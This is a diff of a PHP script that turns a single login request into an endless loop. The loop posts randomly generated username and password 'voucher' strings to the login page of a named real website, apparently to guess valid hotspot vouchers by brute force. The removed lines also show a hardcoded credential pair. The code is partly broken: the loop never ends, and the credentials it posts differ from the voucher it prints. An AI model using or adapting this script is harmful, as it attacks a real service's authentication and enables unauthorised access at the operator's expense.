@@ -1,12 +1,37 @@
 <?php
 error_reporting(0);
-date_default_timezone_set("Asia/JAKARTA"); 
+function acak($panjang)
+    {
+        $karakter= 'abcdefghijklmnopqrstuvwxyz';
+        $string = '';
+        for ($i = 0; $i < $panjang; $i++) {
+      $pos = rand(0, strlen($karakter)-1);
+      $string .= $karakter{$pos};
+        }
+        return $string;
+    }
 
+function randomString($length)
+    {
+        $str        = "";
+        $characters = '1234567890';
+        $max        = strlen($characters) - 1;
+        for ($i = 0; $i < $length; $i++) {
+            $rand = mt_rand(0, $max);
+            $str .= $characters[$rand];
+        }
+        return $str;
+    }
+            
+date_default_timezone_set("Asia/JAKARTA"); 
+while(true)
+{
 // ACAK Voucher Sesuai Format == Lanjut Besok
 
+echo "Voucher= ".$hasil_1= acak(4)."".randomString(4)."
+";
 
-for ($i= 1; $i <= 1; $i++)
-{
+
 
 $url       = 'http://giyatsamedia.com/login';
 
@@ -14,25 +39,24 @@ $headers   = array(
 'POST /login HTTP/1.1',
 'Host: giyatsamedia.com',
 'Connection: keep-alive',
-
 'Cache-Control: max-age=0',
-'Origin: http://giyatsamedia.com';
+'Origin: http://giyatsamedia.com',
 'Upgrade-Insecure-Requests: 1',
 'Content-Type: application/x-www-form-urlencoded',
-'User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; 2014812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36';
+'User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; 2014812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36',
 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
 'Referer: http://giyatsamedia.com/login',
-'Accept-Encoding: gzip, deflate';
+'Accept-Encoding: gzip, deflate',
 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',);
 
 
-$post   = "username=kpms999&password=kpms9999"; 
+$post   = "username=".$hasil_1= acak(4)."".randomString(4)."&password=".$hasil_1= acak(4)."".randomString(4).""; 
 $post      = json_decode(yarzCurl($url, $post, false, $headers, true));
-
 }
 
+
     
-print '<pre>'.print_r($post,1).'</pre>'; die();
+print ' prosessss'; die();
 function yarzCurl($url, $fields = false, $cookie = false, $httpheader = false, $encoding = false)
 
 {
